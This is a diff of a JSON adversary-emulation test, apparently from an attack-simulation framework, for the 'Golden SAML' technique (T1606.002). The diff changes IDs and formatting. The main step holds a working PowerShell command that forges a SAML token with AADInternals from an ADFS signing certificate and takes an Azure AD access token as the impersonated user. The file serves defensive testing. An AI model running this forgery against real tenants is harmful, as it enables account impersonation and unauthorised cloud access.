@@ -7,68 +7,68 @@
   ],
   "steps": [
     {
-      "id": "96cbc330-e622-4ce6-905a-87e043081c72",
+      "id": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43",
       "type": "execute-command",
       "data": {
-        "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"\n",
+        "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "39af643e-e7c6-46bc-9740-f9980461e7bc",
+      "id": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
       "name": "Check dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "a8267fbb-3b86-473a-87fd-c2583b636a99",
+      "id": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b",
       "name": "Resolve dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "Install-Module -Name AADInternals -Force\n",
-        "command_type": ""
+        "command": "Install-Module -Name AADInternals -Force",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "617f3f4d-2a11-4579-af52-91d0691daa47",
+      "id": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2",
       "name": "Re-check dependency 1/1",
       "description": "AADInternals module must be installed.\n",
       "type": "execute-command",
       "data": {
-        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "39af643e-e7c6-46bc-9740-f9980461e7bc",
+      "s": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
       "p": "on-success",
-      "o": "96cbc330-e622-4ce6-905a-87e043081c72"
+      "o": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43"
     },
     {
-      "s": "39af643e-e7c6-46bc-9740-f9980461e7bc",
+      "s": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
       "p": "on-failure",
-      "o": "a8267fbb-3b86-473a-87fd-c2583b636a99"
+      "o": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b"
     },
     {
-      "s": "a8267fbb-3b86-473a-87fd-c2583b636a99",
+      "s": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b",
       "p": "on-success",
-      "o": "617f3f4d-2a11-4579-af52-91d0691daa47"
+      "o": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2"
     },
     {
-      "s": "617f3f4d-2a11-4579-af52-91d0691daa47",
+      "s": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2",
       "p": "on-failure",
-      "o": "96cbc330-e622-4ce6-905a-87e043081c72"
+      "o": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43"
     }
   ],
   "tags": [
@@ -76,6 +76,12 @@
     "T1606.002"
   ],
   "input_arguments": [
+    {
+      "name": "certificate_path",
+      "type": "path",
+      "description": "Token signing certificate path. See T1552.004 to export it",
+      "value": ".\\ADFS_signing.pfx"
+    },
     {
       "name": "immutable_id",
       "type": "string",
@@ -87,12 +93,6 @@
       "type": "string",
       "description": "Issuer URI of the ADFS service",
       "value": "http://contoso.com/adfs/services/trust/"
-    },
-    {
-      "name": "certificate_path",
-      "type": "path",
-      "description": "Token signing certificate path. See T1552.004 to export it",
-      "value": ".\\ADFS_signing.pfx"
     }
   ]
 }
